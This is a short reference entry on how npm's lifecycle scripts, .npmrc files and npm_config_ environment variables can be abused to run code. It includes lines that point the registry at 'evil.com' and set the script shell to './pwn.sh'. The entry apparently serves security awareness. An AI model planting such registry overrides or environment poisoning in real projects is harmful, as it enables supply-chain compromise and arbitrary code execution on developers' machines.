---
title: NPM
tags:
  - config-file
  - eval-sh
  - eval-js
references: 
- https://docs.npmjs.com/cli/v11/using-npm/scripts#life-cycle-operation-order
- https://docs.npmjs.com/cli/v11/configuring-npm/npmrc
- https://docs.npmjs.com/cli/v8/using-npm/config#environment-variables
files: [package.json,.npmrc]
---

`npm` is a package manager for javascript.

## `package.json`

Most of its commands will consume `package.json` `scripts` section, except for 
`npm ci`. It doesn't work if `--ignore-scripts` is specified.

| Command | Aliases | Section |
| -- | -- | -- |
| `npm diff --diff=.`|  | `prepare` |
| `npm restart`| | `prerestart`, `restart`, `postrestart` |
| `npm run-script <x>`| `run`, `rum`, `urn` | `pre<x>`, `<x>`,`post<x>` |
| `npm start`| | `prestart`, `start` or `server.js`, `poststart` |
| `npm stop`| | `prestop`, `stop`, `poststop` |
| `npm test`| `tst`, `t` | `pretest`, `test`, `posttest` |
| `npm version <version>`| `verison` |`postversion`, `version`, `preversion` |
| `npm install`|  `add`, `i`, `in`, `ins`, `inst`, `insta`, `instal`, `isnt`, `isnta`, `isntal`, `isntall` |`postversion`, `version`, `preversion` |

`package.json`:

```json
{
  "scripts": {
    "<section>": "<cmd>"
  }
}
```

## `.npmrc`

`.npmrc` can configure `npm`. It can be defined in multiple directories:

- `./.npmrc`
- `~/.npmrc`
- `$PREFIX/etc/npmrc`
- `/path/to/npm/npmrc`

It can be used to overwrite the standard NPM registry with an attacker-controlled registry:

```yaml
registry=https://evil.com/
```

So `npm install -g something` would not install the standard version, but the
one from the attacker. It doesn't work if `--registry=` is specified.

## Environment variables

`npm` will use environment variables that start with **npm_config_** as
a parameter. An attack with env-var poisoning can execute a file using
`export npm_config_script_shell="./pwn.sh"` or set registry `export registry=https://evil.com`.
